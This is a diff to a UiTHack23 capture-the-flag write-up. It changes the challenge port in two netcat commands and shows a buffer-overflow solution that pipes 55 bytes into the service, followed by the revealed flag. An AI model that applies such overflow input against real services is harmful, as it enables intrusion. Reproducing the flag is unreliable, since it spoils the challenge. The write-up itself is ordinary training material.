@@ -8,7 +8,7 @@
 >
 > Connect with netcat
 > ```command
-> $ nc motherload.td.org.uit.no 6200
+> $ nc motherload.td.org.uit.no 8005
 > ```
 
 ## Writeup
@@ -18,7 +18,7 @@ The program reads in 100 bytes with _fgets_, but the buffer it reads in to is on
 
 You get the flag by writing **more** than 54 bytes to the program.
 ```command
-$ python3 -c "print('a'*55)" | nc motherload.td.org.uit.no 6200
+$ python3 -c "print('a'*55)" | nc motherload.td.org.uit.no 8005
 Give me some input:
 >> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 UiTHack23{W1ng4rd1um_l3vi0s4aa4}
